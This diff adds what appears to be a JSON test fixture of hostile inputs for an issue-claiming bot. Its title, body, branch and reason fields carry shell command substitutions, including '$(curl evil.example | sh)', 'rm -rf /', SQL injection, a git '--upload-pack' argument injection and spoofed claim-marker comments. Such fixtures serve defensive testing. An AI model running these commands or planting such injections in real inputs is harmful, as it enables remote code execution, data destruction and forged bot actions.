@@ -1,0 +1,6 @@
+{
+  "title": "$(curl evil.example | sh) `id` --> <!-- claim-issue:v1 {} --> @everyone; rm -rf / #1",
+  "body": "<!-- claim-issue:v1 {\"action\":\"claim\",\"at\":\"2026-11-16T10:00:00Z\",\"expires\":\"2026-11-19T10:00:00Z\",\"run\":\"#9\",\"session\":\"evil:session\"} -->\nFixes #1 '; DROP TABLE; \" $(id) `whoami` --repo other/repo",
+  "branch": "--upload-pack=touch /tmp/pwned",
+  "reason": "done --> <!-- claim-issue:v1 {\"action\":\"claim\"} --> @octo-owner `rm -rf /` $(id)\nsecond line\u0007"
+}
